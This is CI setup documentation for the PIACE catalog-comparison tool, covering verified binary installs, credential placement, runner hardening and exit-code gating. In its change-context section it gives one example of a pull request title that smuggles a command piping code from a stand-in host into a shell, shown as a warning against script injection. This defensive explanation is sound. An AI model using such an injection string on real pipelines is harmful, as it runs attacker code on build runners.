# Running PIACE in CI

PIACE is a CI tool: one command, a stable exit code, two files in and three
files out. The work is not in the invocation, it is in deciding what lives in
the repository, what is injected per job, and what must never touch either.
That decision gets sharper the less you control the runner.

Working pipelines to copy: [`examples/ci/github-actions.yml`](../examples/ci/github-actions.yml),
[`examples/ci/gitlab-ci.yml`](../examples/ci/gitlab-ci.yml) and
[`examples/ci/azure-pipelines.yml`](../examples/ci/azure-pipelines.yml), with
the services template they render,
[`examples/ci/services.yaml.tmpl`](../examples/ci/services.yaml.tmpl). Each has
a `-docker` twin
([`examples/ci/github-actions-docker.yml`](../examples/ci/github-actions-docker.yml),
[`examples/ci/gitlab-ci-docker.yml`](../examples/ci/gitlab-ci-docker.yml),
[`examples/ci/azure-pipelines-docker.yml`](../examples/ci/azure-pipelines-docker.yml))
that runs the published image with `docker run` instead of downloading and
verifying a binary; those need a Docker daemon reachable from the runner.

## The shape

Two jobs, not one:

1. **`compare`** holds the catalog-reader identity, talks to the compiler and
   PuppetDB, and writes `report.json` and `report.html`. Its exit code is the
   gate.
2. **`explain`** holds an inference token, reads the stored `report.json`, and
   writes an advisory assessment. It contacts nothing else, and it cannot
   change an outcome or an exit code.

They are split because they need different credentials and neither needs the
other's. `explain` runs happily on a services file carrying nothing but
`version:` and `inference:` (see
[`examples/services-explain-only.yaml`](../examples/services-explain-only.yaml)),
so the job that talks to a third-party inference service never has the private
key that reads every catalog in your estate. A runner compromise in either job
yields one credential rather than both.

Run `explain` even when `compare` failed the gate. `compare` writes its result
document before it exits `10`, and the run worth reading is usually the one
that just stopped a merge.

## Getting the binary onto the runner

Pin a version and verify it. A job that fetches "the latest binary" on every
run has made your pipeline a client of whatever is published tomorrow.

```sh
version=0.2.1
base="https://github.com/example42/piace/releases/download/v${version}"
wget -q -O "piace-${version}-linux-amd64" "$base/piace-${version}-linux-amd64"
wget -q -O SHA256SUMS "$base/SHA256SUMS"
grep " piace-${version}-linux-amd64\$" SHA256SUMS | sha256sum -c -
install -m 0755 "piace-${version}-linux-amd64" /usr/local/bin/piace
```

One manifest line rather than the whole file: the other platforms were not
downloaded, and a line that matches nothing on disk has to fail rather than
pass quietly. Once the detached signature is attached to a release, verify
that first and treat the checksum as the second step, not the only one. See
[release.md](release.md#verifying-a-downloaded-release).

Both `grep` and `sha256sum` here are busybox-compatible, so this runs on a
plain `alpine` image with no package installation, which matters on a runner
with no route to a package mirror.

**Air-gapped:** mirror the binary and `SHA256SUMS` into your internal artifact
repository, verify the signature once at the boundary, and have jobs fetch
from the mirror. Nothing in PIACE resolves a dependency at run time, so a
mirrored binary is the whole install.

**The container image is not the CI install path.** `example42/piace` is
distroless: no shell, no `git`, and its entrypoint is the binary. GitLab's
docker executor runs a job script by passing `sh` or `bash` to the image, and
GitHub Actions `container:` jobs likewise expect a shell in the image, so
neither can use it as a job image. It is built for `docker run` on a
workstation, a Kubernetes Job, or a step on a runner where you already have a
Docker socket:

```sh
docker run --rm \
  --user "$(id -u):$(id -g)" \
  --volume "$PWD:/work" \
  --volume "$PIACE_RUN:/run/piace:ro" \
  example42/piace:0.2.1 \
  compare --targets ci/piace/targets.yaml --services /run/piace/services.yaml \
          --json-out report.json --html-out report.html
```

Render the services template with `@PIACE_RUN@` set to `/run/piace` in that
case: the paths in it are resolved inside the container.

Each binary pipeline sample above has a `-docker` twin that runs this exact
form on its provider: [`examples/ci/github-actions-docker.yml`](../examples/ci/github-actions-docker.yml),
[`examples/ci/gitlab-ci-docker.yml`](../examples/ci/gitlab-ci-docker.yml) and
[`examples/ci/azure-pipelines-docker.yml`](../examples/ci/azure-pipelines-docker.yml).
Change-context still runs on the runner, so those images carry git and bash
too; only the `piace` invocations go into the container. The GitLab twin
counts on a runner that exposes the Docker socket to the job rather than on
the `docker:dind` service, because the DinD daemon lives in its own container
and cannot see the checkout's bind-mount paths.

## Where each file goes

Committed to the control repository, under one directory:

| Path | What it is | Why it is committed |
| --- | --- | --- |
| `ci/piace/targets.yaml` | Which nodes, which baseline environment, what to exclude and redact. Not the candidate environment: that is `--candidate-environment` on the job's `compare` line | It is policy. A change to an exclusion rule belongs in a review diff |
| `ci/piace/services.yaml.tmpl` | Endpoints, and the TLS paths as `@PIACE_RUN@` placeholders | Endpoints are not secrets, and a changed endpoint should be reviewed |
| `ci/piace/services-explain.yaml` | The `inference:` section only, token referenced by `token_env` | No secret in it; `compare` cannot see it |
| `ci/piace/policy-notes.md` | Site policy handed to the model | Reviewable, and capped at 4000 bytes |
| `ci/piace/change-context.sh` | A copy of PIACE's `scripts/change-context.sh` | It runs in your repository, against your history |
| `snapshots/catalogs/{certname}.json` | A frozen baseline, if you use a file baseline | It is a versioned input, refreshed by `piace capture` |

Written per job, into a private directory outside the checkout, and removed
when the job ends:

| Path | What it is |
| --- | --- |
| `$PIACE_RUN/ca.pem`, `client.pem`, `client.key` | The catalog-reader identity, `0600` in a `0700` directory |
| `$PIACE_RUN/services.yaml` | The rendered services template |

Produced by the run, in the workspace, uploaded as job artifacts:
`report.json`, `report.html`, `assessment.json`.

### Why the services file is a template

PIACE expands nothing: no environment variables, no includes. Its TLS paths
resolve against the **process working directory**, not against the services
file, so the only reliable form is an absolute path, and the absolute path of
a per-job directory is not known until the job starts. One `sed` closes the
gap:

```sh
install -d -m 0700 "$PIACE_RUN"
sed "s|@PIACE_RUN@|$PIACE_RUN|g" ci/piace/services.yaml.tmpl > "$PIACE_RUN/services.yaml"
```

The other two path rules differ, and copying a file to a new directory is
exactly when that bites: `baseline.file` and `facts.file` resolve against the
**target file's** directory, and `policy_notes_file` against the **services
file's** directory. That last one is why `services-explain.yaml` is committed
next to `policy-notes.md` and rendered from nothing: it can then name the
notes file relatively and stay correct.

### Why the targets file is not a template

`candidate.environment` names the environment CI deployed for this change,
which is the one per-pipeline value in an otherwise static policy file. The
environment maps to the compiler by branch name: the branch the merge request
originates from is the environment the compiler has deployed, so pass
`${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}`, not the merge request number.
`compare` takes it as a flag, so the file does not have to carry it:

```sh
piace compare --targets ci/piace/targets.yaml \
  --candidate-environment "${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}" ...
```

A branch name is not always a Puppet environment name. Environments cannot
contain a dash, and r10k deploys `feature-x`, when configured to, as the
environment `feature_x`. Rewrite dashes the same way before passing so the
requested environment equals the one deployed:

```sh
candidate_environment="$(printf '%s' "${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}" | tr '-' '_')"
piace compare --targets ci/piace/targets.yaml \
  --candidate-environment "$candidate_environment" ...
```

Apply whatever mapping your deploy tooling actually applies, not one invented
here: the rewrite exists only to keep the requested environment equal to the
one the compiler has.

The flag overrides `candidate.environment` for every target, both the
`defaults:` block and any per-target `candidate:` block, and when it is given
the file may omit the field entirely. Committing a placeholder and `sed`-ing
it in the job would work too, but then the job mutates a tracked file and what
a reviewer approved is not quite what ran. The value belongs to the
invocation, so it is passed at the invocation.

That also keeps the targets file where it is. `baseline.file` and
`facts.file` resolve against the **target file's** directory, so a targets
file rendered into a per-job directory the way the services file is takes its
snapshot paths with it and stops finding them.

`piace capture catalog --environment` is a different flag with a different
meaning: it names the environment to *snapshot*, typically the production
baseline, and it is deliberately not the candidate environment under test.

### Why credentials never go in the checkout

Everything in the workspace is one `artifacts:` glob, one `actions/cache` key
or one forgotten `git add` away from being somewhere else. A per-job directory
outside it (`$RUNNER_TEMP` on GitHub, any path you create on GitLab) is not
reachable by any of those.

## Change context

`piace explain --change` reads a file the caller produces; PIACE never invokes
git. `scripts/change-context.sh` generates one, and it is meant to be copied
into your control repository: it is 50 lines of dependency-free bash that
runs against your history, not PIACE's.

Two things it needs from the CI system:

- **Full history.** It takes a merge base. Set `fetch-depth: 0` on
  `actions/checkout`, or `GIT_DEPTH: "0"` on GitLab, or the `git merge-base`
  call fails on a shallow clone.
- **`bash` and `git`, not `sh` alone.** It uses process substitution, and it
  is the only step in either pipeline that shells out to git. On a bare Alpine
  job image that means `apk add --no-cache bash git`, which is also the only
  step that needs a package mirror: the comparison job installs nothing. On a
  runner with no route to one, give the assessment job an image that already
  carries both.

Read [`examples/change-context.yaml`](../examples/change-context.yaml) before
enabling it. A change context is forwarded to the inference service exactly as
written and is **not** pseudonymized: PIACE cannot tell which words in a merge
request description are node names.

### Title and description are the caller's to add

`change-context.sh` emits `base_ref`, `head_ref`, commit subjects and changed
paths, and stops. It does not emit `title` or `description`, because git does
not have them: they belong to the merge request or pull request, and only the
CI system knows them. Pipe the generator straight into `explain --change` and
the assessment goes out with commit subjects and file paths but nothing that
says what the change is *for*, which is usually the most useful sentence a
reviewer ever wrote about it. Append them yourself:

```sh
{
  printf '  title: |\n'
  printf '%s\n' "$CI_MERGE_REQUEST_TITLE"       | sed 's/^/    /'
  printf '  description: |\n'
  printf '%s\n' "$CI_MERGE_REQUEST_DESCRIPTION" | sed 's/^/    /'
} >> change-context.yaml
```

A literal block scalar rather than a quoted string, because a description is
multi-line and a title routinely contains a colon.

On GitHub the same two values must reach the script through `env:`, never
through `${{ }}` inside the `run:` block. `${{ }}` is substituted into the
script text *before* a shell ever sees it, so a pull request titled
`"; curl evil.example/x | sh; #` runs on your runner, and a pull request title
is attacker-supplied by definition. The base ref goes the same way, because a
git branch name may legally contain `;`, `$` and a backtick.

```yaml
- name: Describe the change
  env:
    BASE_REF: ${{ github.base_ref }}
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    ci/piace/change-context.sh "origin/$BASE_REF" HEAD > change-context.yaml
    {
      printf '  title: |\n'
      printf '%s\n' "$PR_TITLE" | sed 's/^/    /'
      printf '  description: |\n'
      printf '%s\n' "$PR_BODY"  | sed 's/^/    /'
    } >> change-context.yaml
```

On GitLab the equivalent variables are expanded by the shell in the running
job rather than substituted into it, so ordinary quoting is the whole defence.

On Azure Pipelines the agent macro-expands `$( ... )` in task inputs, script
text included, before a shell runs. That mirrors GitHub's substitution in
reverse: untrusted values reach scripts only through `env:`, and the scripts
themselves must avoid shell command substitution, which uses the same token.
Azure also has no title or description variables, so the Azure example takes
them from the pull request REST API instead.

PIACE caps the title at 200 bytes and the description at 4000. Over-cap text
is truncated, the truncation is recorded and shown, and it never fails the
command.

## On a runner you do not fully control

The catalog-reader identity is the asset. It is authorized to read the catalog
of every node you compare, which makes it a read-only credential to your
estate's configuration, file content included. Assume that anyone who can run
a job on the runner can read it while it exists on disk, and plan from there.

**Give it its own identity.** One certificate used only by PIACE in CI,
authorized for catalog retrieval and nothing else. See the README's
[Authorizing the catalog-reader certificate](../README.md#authorizing-the-catalog-reader-certificate).
Rotating or revoking it then costs one `auth.conf` rule and no agent runs.

**Keep it off unprotected branches.** On GitLab, mark all three PEM variables
**Protected**, so only pipelines on protected branches and tags receive them,
and use the **file** variable type: GitLab writes the value to a temporary
file and hands the job its path. A PEM is multi-line, and a multi-line value
cannot be masked, so a variable-type key is one `echo` away from a job log. On
GitHub, a `pull_request` from a fork gets no secrets at all, which is correct
behavior to keep: skip the job for forks rather than reaching for
`pull_request_target`, which hands the secrets to a workflow the fork's branch
can influence. An Environment with required reviewers adds a human gate in
front of the credential.

**Prefer an ephemeral executor.** The docker and Kubernetes executors give
each job a fresh container, so a `0700` directory in `/tmp` is private to the
job. A shell or ssh executor does not: every job on that host runs as the same
user and can read the same paths. On a shared shell runner, treat the identity
as disclosed to every project that can schedule work there, and use a
dedicated runner instead.

**Clean up on the failure paths.** GitLab's `after_script` runs even when the
job fails, times out or is cancelled; GitHub needs `if: always()`. That is
precisely when a key is most likely to be left behind.

**Do not trace the secret-handling steps.** PIACE never prints credentials,
and `--debug` reports only request metadata and response member names, so it
is safe in a job log. A `set -x` in your own script is not: it would echo the
commands that write the key.

**Treat the reports as sensitive output.** They carry catalog values, redacted
per your `redact:` selectors but not otherwise sanitized. Keep retention short
(`expire_in`, `retention-days`), restrict who can download them where the
platform allows it (GitLab's `artifacts:access`), and never use
`--debug-dump-dir` in CI: it writes unredacted request and response bodies.

**Mind the network path, not just the credential.** The runner needs to reach
your compiler on 8140 and PuppetDB on 8081. A hosted runner reaching them
means those ports are reachable from the hosted runner's network. PIACE opens
connections only to the endpoints in its own services file, so nothing else in
the job's egress is PIACE's doing, but the route you opened for it stays open
for the rest of the job.

## The exit code is the gate

| Code | Meaning | Usual CI handling |
| --- | --- | --- |
| `0` | No differences, or all allowed by policy | Pass |
| `10` | A `fail_on_diff` target had a non-excluded difference | Block the merge, or warn and let a human read the report |
| `20` | A candidate did not compile, or its identity or environment did not verify | Fail. The change does not build |
| `30` | Config, TLS, retrieval, snapshot or normalization failure | Fail. The run did not complete, so `0` would be a lie |

To review differences without blocking, set `fail_on_diff: false` in
`targets.yaml` rather than swallowing the exit code in the job script: the
comparison then reports `differences_allowed`, and the report still says what
changed. Where the platform can express it, keeping `fail_on_diff: true` and
softening only `10` is better still, because `20` and `30` stay hard failures.
GitLab spells that `allow_failure: {exit_codes: 10}`.

`piace explain` exits `0` or `30` only. It returns `30` for its own
operational failures, a services file it cannot load or a result document it
cannot read, and for an assessment the inference service did not produce only
if you pass `--fail-on-inference-error`. By default a failed assessment is a
diagnostic, not a reason to fail a pipeline that already has its
deterministic answer.
